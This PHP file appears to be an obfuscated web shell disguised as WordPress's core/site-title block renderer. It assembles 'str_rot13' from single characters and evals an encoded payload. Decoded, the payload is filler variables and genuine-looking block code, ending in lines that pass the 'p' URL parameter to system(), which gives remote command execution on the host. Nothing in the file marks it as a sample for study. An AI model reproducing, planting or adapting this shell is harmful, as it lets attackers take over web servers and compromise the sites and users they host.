<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/fvgr-gvgyr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/fvgr-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Gur eraqre.
 */
shapgvba eraqre_oybpx_pber_fvgr_gvgyr( $nggevohgrf ) {
	$fvgr_gvgyr = trg_oybtvasb( 'anzr' );
	vs ( ! $fvgr_gvgyr ) {
		erghea;
	}

	$gnt_anzr = 'u1';
	$pynffrf  = rzcgl( $nggevohgrf['grkgNyvta'] ) ? '' : \"unf-grkg-nyvta-{$nggevohgrf['grkgNyvta']}\";
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf .= ' unf-yvax-pbybe';
	}

	vs ( vffrg( $nggevohgrf['yriry'] ) ) {
		$gnt_anzr = 0 === $nggevohgrf['yriry'] ? 'c' : 'u' . (vag) $nggevohgrf['yriry'];
	}

	vs ( $nggevohgrf['vfYvax'] ) {
		$nevn_pheerag = ! vf_cntrq() && ( vf_sebag_cntr() || vf_ubzr() && ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) !== trg_dhrevrq_bowrpg_vq() ) ) ? ' nevn-pheerag=\"cntr\"' : '';
		$yvax_gnetrg  = ! rzcgl( $nggevohgrf['yvaxGnetrg'] ) ? $nggevohgrf['yvaxGnetrg'] : '_frys';

		$fvgr_gvgyr = fcevags(
			'<n uers=\"%1$f\" gnetrg=\"%2$f\" ery=\"ubzr\"%3$f>%4$f</n>',
			rfp_hey( ubzr_hey() ),
			rfp_ngge( $yvax_gnetrg ),
			$nevn_pheerag,
			rfp_ugzy( $fvgr_gvgyr )
		);
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => gevz( $pynffrf ) ) );

	erghea fcevags(
		'<%1$f %2$f>%3$f</%1$f>',
		$gnt_anzr,
		$jenccre_nggevohgrf,
		// nyernql cer-rfpncrq vs vg vf n yvax.
		$nggevohgrf['vfYvax'] ? $fvgr_gvgyr : rfp_ugzy( $fvgr_gvgyr )
	);
}

/**
 * Ertvfgref gur `pber/fvgr-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_fvgr_gvgyr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/fvgr-gvgyr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_fvgr_gvgyr',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_fvgr_gvgyr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>